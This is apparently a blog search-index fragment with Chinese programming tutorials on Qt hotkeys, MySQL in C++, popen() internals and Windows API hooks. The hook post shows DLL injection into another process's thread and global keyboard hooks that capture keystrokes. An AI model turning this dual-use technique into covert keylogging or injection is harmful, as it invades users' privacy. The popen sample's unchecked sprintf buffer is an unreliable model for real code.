    <content type="text"><![CDATA[要想在Qt支持全局注册热键，Windows下方法很简单RegisterHotKey函数可以满足。当然，这只能在Windows下操作，那么，是否有一个跨平台的全局注册热键库方便使用呢？ QHotkey官网 Github QHotkey类参考 PS: QHotkey适用于 Windows, Mac ， X11 从github上获取源文件，自行编译(无需安装) git clone https://github.com/Skycoder42/QHotkey.gitcd QHotkeyqmakemake 之后就可以使用了。使用方法如下创建一个Qt项目，在 .pro 中添加 include(QHotkey/qhotkey.pri)LIBS += -L$$PWD/QHotkey/QHotkey -lQHotkeyINCLUDEPATH += $$PWD/QHotkey/QHotkey 注意，我把 QHotkey 文件夹复制到项目目录下，并且要include qhotkey.priLIBS 和 INCLUDEPATH不能直接写成，否则出现 No such file or directory：LIBS += -LQHotkey/QHotkey -lQHotkeyINCLUDEPATH += QHotkey/QHotkey 主要代码实例 1234567891011121314151617181920212223#include "QHotkey"bool ispressed=false;Widget::Widget(QWidget *parent) : QWidget(parent), ui(new Ui::Widget)&#123; ui-&gt;setupUi(this); // 过滤警告 QLoggingCategory::setFilterRules(QStringLiteral("QHotkey.warning=false")); // Ctrl+P 之间不能有空格 QHotkey *hotkey = new QHotkey&#123;QKeySequence("Ctrl+P"),true&#125;; connect(hotkey, &amp;QHotkey::activated, [this]()&#123; //这里进行判断,只允许按下一次 if(ispressed==false)&#123; ispressed=true; QMessageBox::information(this,"Hello","Hello"); ispressed=false; &#125;else&#123; ispressed=true; return; &#125; &#125;);&#125; 默认的，QHotkey会打印一些警告信息，不过可以用 QLoggingCategory::setFilterRules 过滤掉这些信息。 1234567QHotkey (QObject *parent=Q_NULLPTR)QHotkey (const QKeySequence &amp;shortcut, bool autoRegister=false, QObject *parent=Q_NULLPTR)QHotkey (Qt::Key key, Qt::KeyboardModifiers modifiers, bool autoRegister=false, QObject *parent=Q_NULLPTR)QHotkey (const NativeShortcut &amp;shortcut, bool autoRegister=false, QObject *parent=Q_NULLPTR)bool setRegistered (bool registered)bool setShortcut (const QKeySequence &amp;shortcut, bool autoRegister=false)bool setShortcut (Qt::Key key, Qt::KeyboardModifiers modifiers, bool autoRegister=false) 有两种方法构造一个 QHotkey 对象： 1.提供一个 QKeySequence 对象，如果 QHotkey 构造函数第二个参数为 false，则必须调用 bool setRegistered (bool registered) 注册热键 1QHotkey *hotkey = new QHotkey&#123;QKeySequence(&quot;Ctrl+P&quot;),true&#125;; 2.提供Qt::Key和Qt::KeyboardModifiers，不过是通过setShortcut设置。如下 1QHotkey *hotkey =new QHotkey(this);hotkey-&gt;setShortcut(Qt::Key_A,Qt::ControlModifier,true); 注册热键成功后就可以在槽函数QHotkey::activated中进行处理了 结尾是不是很简单呢？]]></content>
      <categories>
        <category>Programming</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Qt</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux下C++连接Mysql]]></title>
    <url>%2Flinux-cpp-connect-mysql%2F</url>
    <content type="text"><![CDATA[前言在连接MySQL之前，确保系统安装了MySQL，并且安装了对应的库文件。可以到官网下载不同版本的MySQL（自行编译安装）传送门&gt;&gt;具体安装方法不再多说 代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#include &lt;iostream&gt;#include &lt;mysql/mysql.h&gt;void connMYSQL()&#123; //mysql_server_init(NULL,NULL,NULL); MYSQL mysql; mysql_init(&amp;mysql); //设置字符集 方法1 int r=mysql_options(&amp;mysql,MYSQL_SET_CHARSET_NAME,"utf8"); if(r==0)&#123; printf("设置字符集 utf8 ok\n"); &#125; //连接mysql MYSQL *m= mysql_real_connect(&amp;mysql, "127.0.0.1","root","123456","db_0", 3306,0,0); if(!m)&#123; unsigned int errorCode=mysql_errno(&amp;mysql); const char *errorString=mysql_error(&amp;mysql); printf("连接数据库失败 : %s\n",errorString); &#125; //设置字符集 方法2 mysql_query(&amp;mysql,"set names 'utf8';"); mysql_query(&amp;mysql,"select *from tb_0;"); //获取资源结果集 MYSQL_RES *result=mysql_store_result(&amp;mysql); //返回查询受影响的行 int affectedRows=mysql_affected_rows(&amp;mysql); printf("affected rows: %d \n",affectedRows); //获取记录数 int rowcount=mysql_num_rows(result); //获取字段数 int fieldcount=mysql_num_fields(result); printf("rowCount:%d fieldCount:%d \n",rowcount,fieldcount); MYSQL_FIELD *field=NULL; //遍历字段 while (field=mysql_fetch_field(result))&#123; std::cout&lt;&lt;"--&gt;"&lt;&lt;field-&gt;name&lt;&lt;std::endl; &#125; //field= mysql_fetch_field_direct(result,0); //field= mysql_fetch_field_direct(result,1); printf("——————————————————————————————\n"); //char ** = MYSQL_ROW MYSQL_ROW row=NULL; //遍历行 while(row=mysql_fetch_row(result))&#123; printf("%s\t%s\t%s\t%s\t%s\n",row[0],row[1],row[2],row[3],row[4]); &#125; printf("——————————————————————————————\n"); //释放结果集 mysql_free_result(result); //关闭连接 mysql_close(&amp;mysql); //mysql_server_end(); //mysql_library_end();&#125;int main() &#123; connMYSQL(); return 0;&#125; 由于我使用的是CLion，所以当我写出来的源文件是无法直接编译的，这时候可以在CMakeLists.txt *内添加 *target_link_libraries(mysqlconn /usr/lib/libmysqlclient.so)其中 mysqlconn 为项目名，/usr/lib/libmysqlclient.so 为库文件路径如 /usr/lib/ 不存在 libmysqlclient.so 文件，那么可以用 locate libmysqlclient 找到系统内存在的 libmysqlclient库文件。比如我的本来是 /usr/lib/x86_64-linux-gnu/libmysqlclient.so ，那么我就可以设置个软链接 ln -s /usr/lib/x86_64-linux-gnu/libmysqlclient.so /usr/lib/libmysqlclient.so 或者简单点也可以直接 g++ main.cpp -o test -lmysqlclient./test]]></content>
      <categories>
        <category>Programming</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>C</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Partition X does not start on physical sector boundary]]></title>
    <url>%2Flinux-partition-x%2F</url>
    <content type="text"><![CDATA[前言今天好好的，突然来了这个，还以为我原来分的扩展分区不能用了。所以赶紧百度，百度不行Google，果然，还是Googl牛！然而英文，只好硬着头皮去看。。。 原文: https://askubuntu.com/questions/156994/partition-does-not-start-on-physical-sector-boundary 解决方案错误情况图 红色那个错误提示：Partition 3 does not start on physical sector boundary.我第一次是把那个 /dev/sda5 删除在新建格式化，结果还是不行，最后我看到老外用 gparted 我把以前的拓展分区全部删除，结果如图【未分配】 新建扩展分区，之前的空余空间为 1MB 然后在新建的扩展分区那新建一个逻辑分区，同样也是1MB 全部应用，完成 这时在终端下输入 fdisk -l应该可以看到 没有错误了]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[用Qt实现类似QQ表情窗口]]></title>
    <url>%2Flinux-qt-qqwindow%2F</url>
    <content type="text"><![CDATA[演示 实现起来比较简单,就是在每个TableWidget的单元格设置一个Widget,如Label.重写QLabel类中的两个函数,达到鼠标进入离开单元格时显示的效果 1234567891011121314151617//添加gif到TabWidgetvoid Widget::addGIFtoTableWidget(int row,int column,QString file)&#123; //自定义类,用来重新实现了一些函数 MyLabel *label=new MyLabel; //设置边距 label-&gt;setMargin(3); //gif动画 QMovie *movie=new QMovie; movie-&gt;setFileName(file); movie-&gt;setScaledSize(QSize(24,24)); movie-&gt;start(); movie-&gt;stop(); label-&gt;setMovie(movie); //添加部件到tableWidget ui-&gt;tableWidget-&gt;setCellWidget(row,column,label);&#125; 12345678910111213141516171819202122232425#define QQ_GIF_DIR "../expression/qq/"Widget::Widget(QWidget *parent) : QWidget(parent), ui(new Ui::Widget)&#123; ui-&gt;setupUi(this); //不可选 ui-&gt;tableWidget-&gt;setSelectionMode(QTableWidget::NoSelection); ui-&gt;tableWidget-&gt;setRowCount(10); //初始化 gif表格 int num_index=1; int rowCount= ui-&gt;tableWidget-&gt;rowCount(); int columnCount = ui-&gt;tableWidget-&gt;columnCount(); for (int row = 0; row &lt;rowCount; ++row) &#123; for (int column = 0;column&lt;columnCount; ++column) &#123; QString strFileName=QString("%1%2.gif").arg(QQ_GIF_DIR).arg(num_index); //gif文件是否存在 if(QFileInfo(strFileName).exists()) addGIFtoTableWidget(row,column,strFileName); num_index++; &#125; &#125;&#125; 然后再看看 MyLabel 类 12345678910111213mylabel.h#ifndef MYLABEL_H#define MYLABEL_H#include&lt;QLabel&gt;class MyLabel : public QLabel&#123;public: MyLabel(QWidget *parent=0);protected: void enterEvent(QEvent *event); void leaveEvent(QEvent *event);&#125;;#endif // MYLABEL_H 123456789101112131415161718192021222324mylabel.cpp#include "mylabel.h"#include&lt;QMovie&gt;MyLabel::MyLabel(QWidget *parent):QLabel(parent)&#123;&#125;void MyLabel::enterEvent(QEvent *event)&#123; setStyleSheet("border: 1px solid rgb(111, 156, 207);background-color:rgba(150,150,150,50)"); setCursor(Qt::PointingHandCursor); QMovie *movie=this-&gt;movie(); //开始播放 movie-&gt;start();&#125;void MyLabel::leaveEvent(QEvent *event)&#123; setStyleSheet("border:none"); setCursor(Qt::ArrowCursor); QMovie *movie=this-&gt;movie(); //跳转到动态图的初始帧 movie-&gt;jumpToFrame(0); //停止 movie-&gt;stop();&#125; 我在Ui窗口添加了了一个table widget部件,所以还要先设置相应的参数 OK,的确挺简单的…当然还有很多问题也要考虑…]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Qt</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux popen()函数内部实现原理]]></title>
    <url>%2Flinux-popen%2F</url>
    <content type="text"><![CDATA[最近发现了一个函数 popen()/pclose() ,所以现在打算理清下思路… 正文linux下的 popen 函数,大概就是通过 fork 一个子进程来执行命令并返回执行的结果给父进程. The popen() function shall execute the command specified by the string command. It shall create a pipe between the calling program and the executed command, and shall return a pointer to a stream that can be used to either read from or write to the pipe. http://pubs.opengroup.org/onlinepubs/009695399/functions/popen.html 函数声明如下 123456789#include&lt;stdio.h&gt;/* Create a new stream connected to a pipe running the given command. This function is a possible cancellation point and therefore not marked with __THROW. */extern FILE *popen (const char *__command, const char *__modes) __wur;/* Close a stream opened by popen and return the status of its child. This function is a possible cancellation point and therefore not marked with __THROW. */extern int pclose (FILE *__stream); 当然了,更重要的是要知道该函数内部是怎么实现的,大概步骤如下:(此处仅讨论子进程返回结果给父进程!) 父进程通过 pipe() 创建 读/写匿名管道 ,并关闭写管道pfd[1] 然后 fork() 创建子进程 子进程 close() 读管道pfd[0]和标准输出(STDOUT_FILENO=1) ,并 dup() 写管道pfd[1] 子进程通过 execl() 执行命令,执行的结果为标准输出重定向到了写管道pfd[1] 父进程 wait() 子进程退出,接着 fdopen() 通过文件描述符返回一个 FILE* . 注意返回文件指针时,不能关闭读管道pfd[0],可以通过后续 fclose() 关闭该描述符 fclose() 关闭该读管道pfd[0] 简单实现代码如下: 1234567891011121314151617181920212223242526272829303132FILE* mypopen(const char*cmd)&#123; //管道文件描述符 int pfd[2]; if(pipe(pfd)!=0)&#123; printf("error: %s\n",strerror(errno)); exit(EXIT_FAILURE); &#125; //创建子进程 pid_t pid=fork(); if(pid==0)&#123; close(pfd[0]); //重定向 标准输出 到 写管道 close(STDOUT_FILENO); dup(pfd[1]); char _cmd[50]&#123;0&#125;; sprintf(_cmd,"%s",cmd); execl("/bin/sh","sh","-c",_cmd,NULL); exit(0); &#125; //关闭写管道 close(pfd[1]); //等待子进程退出 int p= wait(0); //printf("%d terminal\n",p); //直接读取数据 //char buffer[1024*2]=&#123;0&#125;; //read(pfd[0],buffer,1024*2); FILE* pfile =fdopen(pfd[0],"r"); if(!pfile) return NULL; return pfile;&#125; 12345678910int main() &#123; FILE *file= mypopen("ls -lSah"); char buffer[1024]; while(fgets(buffer,1024,file))&#123; printf("%s",buffer); &#125; //close pfd[0]! fclose(file); return 0;&#125; 其中,较重要的是在子进程中重定向标准输出,这里给出其他方法重定向标准输出到管道描述符 123456789//方法1//重定向 标准输出 到 写管道close(STDOUT_FILENO);dup(pfd[1]);//方法2,相当于先close(STDOUT_FILENO) ,再dup(pfd[1])dup2(pfd[1],STDOUT_FILENO);//方法3close(STDOUT_FILENO);int fd=fcntl(pfd[1],F_DUPFD); 结尾参考文章: http://blog.csdn.net/litingli/article/details/5891726]]></content>
      <categories>
        <category>Programming</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>C</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Windows API HOOK钩子]]></title>
    <url>%2Fwindows-hook%2F</url>
    <content type="text"><![CDATA[本文讲下Windows API HOOK(钩子),主要和DLL注入联系在一起.Windows系统把每个WindowsAPI函数功能封装到了每一个DLL库文件中,从而提高程序的编译运行效率,而在应用程序运行期间动态库时,必然存在程序获取DLL中的函数地址.于是通过注入DLL来截取信息. 消息HOOKHOOK(挂钩)技术,可分为 内核层(R0)HOOK , 应用层(R3)HOOK ,这两种技术实现起来虽然略相似,但是 内核层HOOK 比起 应用层HOOK 难度要高得多,而且编写的代码也要保证正确(异常机制),不然万一来个赋值给一个空指针的代码,蓝屏就呵呵了…本文主要讲解 应用层hook 主要用到的WindowsAPI 头文件 Winuser.h (include Windows.h)库文件 User32.libDLL文件 User32.dll SetWindowsHookEx123456HHOOK WINAPI SetWindowsHookEx( _In_ int idHook, _In_ HOOKPROC lpfn, _In_ HINSTANCE hMod, _In_ DWORD dwThreadId); 其中 idHook 可选的值有很多种, 更多选项可以到 MSDN https://msdn.microsoft.com/en-us/library/windows/desktop/ms644990(v=vs.85).aspx 查看本文用到其中的 WH_GETMESSAGE 监视发送到消息队列的消息 GetMsgProc其 _In_ HOOKPROC lpfn, 对应的回调函数如下 12345LRESULT CALLBACK GetMsgProc( _In_ int code, _In_ WPARAM wParam, _In_ LPARAM lParam); lParam 参数可以转换为 MSG*结构体MSG* pMsg = (MSG*)lParam; CallNextHookEx这个函数起到传递下一个钩子函数的作用,这样的话,其他钩子才可以继续执行 123456LRESULT WINAPI CallNextHookEx( _In_opt_ HHOOK hhk, _In_ int nCode, _In_ WPARAM wParam, _In_ LPARAM lParam); nCode,wParam,lParam 一般都是 GetMsgProc 中的参数,而 hhk 则为 SetWindowsHookEx 返回的钩子句柄. UnhookWindowsHookEx卸载钩子,与 SetWindowsHookEx 成对使用 123BOOL WINAPI UnhookWindowsHookEx( _In_ HHOOK hhk); 下面以一个简单例子说明(MFC) Source.def文件，用于导出DLL函数 1234LIBRARY hookFun.dll ;dll名EXPORTS ;导出函数SetHook @1UnsetHook @2 DLL模块文件 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#include&lt;windows.h&gt;#define DLL_EXPORT extern "C" __declspec(dllexport)//开始HOOKDLL_EXPORT void _stdcall SetHook(DWORD pid);//取消HOOKDLL_EXPORT void _stdcall UnsetHook();//全局 钩子句柄HHOOK hHook_g = NULL;//全局 DLL模块句柄HINSTANCE hInstance_g = NULL;//DLL 入口函数BOOL APIENTRY DllMain(_In_ void* _DllHandle, _In_ unsigned long _Reason, _In_opt_ void* _Reserved)&#123; if (_Reason==DLL_PROCESS_ATTACH) &#123; //保存当前 DLL模块的句柄到全局，以后要用！ hInstance_g = (HINSTANCE)_DllHandle; &#125; return TRUE;&#125;//自定义消息，处理钩子消息函数#define WM_HOOKMSG WM_USER+100 //过程消息处理函数LRESULT CALLBACK GetMsgProc(_In_ int code,_In_ WPARAM wParam,_In_ LPARAM lParam) &#123; //把 参数 lParam 转换为 MSG 结构体，获取 消息类型 MSG* pMsg = (MSG*)lParam; if (pMsg-&gt;message== WM_HOOKMSG) &#123; MessageBoxA(NULL, "HOOK MSG", NULL, 0); &#125; //继续传递下一个钩子 return CallNextHookEx(hHook_g, code, wParam, lParam);&#125;//开始HOOK，这里过于简单，没有进行其他处理...(-｡-;)//参数--&gt; 线程ID DLL_EXPORT void _stdcall SetHook(DWORD tid)&#123; //安装钩子 //hInstance_g：标识 GetMsgProc 在 该模块内 //tid： 标识是 全局钩子( tid=0 ) 还是指定 线程钩子 hHook_g = SetWindowsHookExW(WH_GETMESSAGE, GetMsgProc, hInstance_g, tid);&#125;//取消HOOKDLL_EXPORT void _stdcall UnsetHook()&#123; //卸载钩子 UnhookWindowsHookEx(hHook_g);&#125; 调用进程主要代码如下 1234567891011121314151617181920212223242526272829303132333435363738394041//自定义消息#define WM_HOOKMSG WM_USER+100//路径#define DLL_PATH L"C:\\hookFun.dll"//SetHook 函数地址typedef void(_stdcall* LPFNSETHOOK)(DWORD);//UnsetHook 函数地址typedef void(_stdcall* LPFNUNSETHOOK)();HMODULE hMo = NULL;void ChookMfcDlg::OnBnClickedButton1()&#123; //获取指定主窗口的句柄 HWND hwndMain = ::FindWindow(NULL, L"剪贴簿查看器 - [剪贴板]"); //保存 进程ID DWORD PID; char szMsg[50]=&#123; 0 &#125;; //返回 线程ID DWORD TID= GetWindowThreadProcessId(hwndMain, &amp;PID); sprintf(szMsg, "Thread ID:%08X", TID); MessageBoxA(NULL, szMsg, szMsg, MB_ICONINFORMATION); //先动态载入 要注入的DLL，然后再把它卸载！！！ hMo= LoadLibrary(DLL_PATH); //获取模块内 SetHook 函数地址 LPFNSETHOOK lpSethook = (LPFNSETHOOK)GetProcAddress(hMo, "SetHook"); //调用SetHook函数 lpSethook(TID); //向 要注入的 进程的线程ID 投递 我自己消息 PostThreadMessageW(TID, WM_HOOKMSG, 0, 0); //获取模块内 UnsetHook 函数地址 LPFNUNSETHOOK lpUnSethook = (LPFNUNSETHOOK)GetProcAddress(hMo, "UnsetHook");&#125;void ChookMfcDlg::OnBnClickedButton2()&#123; //获取模块内 UnsetHook 函数地址 LPFNUNSETHOOK lpUnSethook = (LPFNUNSETHOOK)GetProcAddress(hMo, "UnsetHook"); // 取消HOOK！ lpUnSethook(); //把 主调用进程 的 DLL 卸载，不然会一直存在主调用进程中！！ FreeLibrary(hMo);&#125; 一般来说,注入DLL这项技术确实很老了,注入时可能会失败.so … 键盘HOOK这个例子没有用到DLL,直接勾住当前程序 KeyboardProc —- WH_KEYBOARD(2) LowLevelKeyboardProc —- WH_KEYBOARD_LL(13) 注意 上面的 KeyboardProc 和 LowLevelKeyboardProc 函数，前者是普通的钩子函数，而后者是一个低级的钩子函数，这两个函数的参数不同，所以要获取的值也不同！！ wParam [in]Type: WPARAMThe virtual-key code of the key thatgenerated the keystroke message.lParam [in]Type: LPARAMThe repeat count, scan code, extended-key flag, contextcode, previous key-state flag, and transition-state flag. For more informationabout thelParam parameter, seeKeystroke Message Flags. The following table describes the bits of this value.由此可看出 ，wparam主要是键盘的虚拟键代码，lparam主要是：The lParam parameter of a keystroke message containsadditional information about the keystroke that generated the message. Thisinformation includes therepeat count, the scan code, the extended-key flag, thecontext code, the previous key-state flag, and the transition-state flag.The following illustration shows the locations of these flags and values in thelParam parameter. 当 SetWindowsHookEx() 参数 idHOOK 为 WH_KEYBORAD_LL 时，这个函数的参数中的 wparam 为 键盘消息 ，如WM_KEYDOMN… 那么 lparam 就是一个 LPKBDLLHOOKSTRUCT结构体 了！看这个结构体的名字就知道这是一个用于 低级键盘钩子的，“LL”-&gt;”LowLevel“，呵呵~这个结构体中 包括了 虚拟键代码 和 扫描码! 别忘了还有那个 SetWindowsHookEx() 函数，现在在回忆一下那个函数原型： 123456HHOOK WINAPI SetWindowsHookEx( _In_ int idHook, _In_ HOOKPROC lpfn, _In_ HINSTANCE hMod, _In_ DWORD dwThreadId); 当IdHook为WH_KEYBOARD时，lpfn为KeyboardProc(名字自定义)，hMod为当前程序实例句柄，MFC 有多种方法获取，如: AfxGetInstanceHandle()最后一个 dwThreadId为0 当idHook为WH_KEYBOARD_LL时，dwThreadid必须为当前模块的线程ID！如下表: idHook lpfn hMod dwThreadId WH_KEYBOARD KeyboardProc 当前程序实例句柄 0 WH_KEYBOARD_LL LowLevelKeyboardProc 当前程序实例句柄 当前程序线程ID 代码如下: 12345678910111213141516171819202122232425HHOOK hHook2;LRESULT CALLBACK KeyBoradProc(intcode,WPARAMwp,LPARAMlp)&#123; if (code&lt;0) &#123; return CallNextHookEx(hHook2,code,wp, lp); &#125; WCHAR szkeyValue[20]=&#123; 0 &#125;; //wsprintf(szkeyValue, L"%c", wp); //虚拟键代码 //获取按键的名称 GetKeyNameText(lp,szkeyValue, 50); AfxGetMainWnd()-&gt;SetDlgItemText(IDC_EDIT1,szkeyValue); return CallNextHookEx(hHook2,code,wp, lp);&#125; //安装键盘钩子 hHook2 = SetWindowsHookEx(WH_KEYBOARD,KeyBoradProc,AfxGetInstanceHandle(),GetCurrentThreadId()); //注意这里的线程ID为当前程序的线程ID！ //卸载钩子UnhookWindowsHookEx(hHook2);下面是关于低级键盘钩子的代码； //低级的键盘钩子 hHook= ::SetWindowsHookEx(WH_KEYBOARD_LL,myLowLevelKeyboardProc,AfxGetInstanceHandle(),0);//注意这里TID为 0 //卸载低级钩子UnhookWindowsHookEx(hHook) 12345678910111213141516171819202122232425//低级钩子函数处理过程LRESULT CALLBACK LowLevelKeyboardProc(_In_int code,_In_WPARAMwParam,_In_LPARAMlParam)&#123; if (code &lt; 0) &#123; returnCallNextHookEx(hHook,code,wParam, lParam); &#125; // 低级键盘钩子时，wparam参数为 WM键盘消息！！！ //按下的 if (code ==HC_ACTION&amp;&amp;wParam==WM_KEYDOWN) &#123; LPKBDLLHOOKSTRUCTpKbs = (LPKBDLLHOOKSTRUCT)lParam; WCHARszlMsg[100] = &#123; 0 &#125;; wsprintf(szMsg,L"vkCode:%c-scanCode:%02X",pKbs-&gt;vkCode,pKbs-&gt;scanCode); //ESC键扫描码 if (pKbs-&gt;scanCode==0x01) &#123; returnTRUE; &#125; &#125; return CallNextHookEx(hHook,code,wParam, lParam);&#125;]]></content>
      <categories>
        <category>Programming</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>C</tag>
        <tag>Windows</tag>
      </tags>
  </entry>
</search>
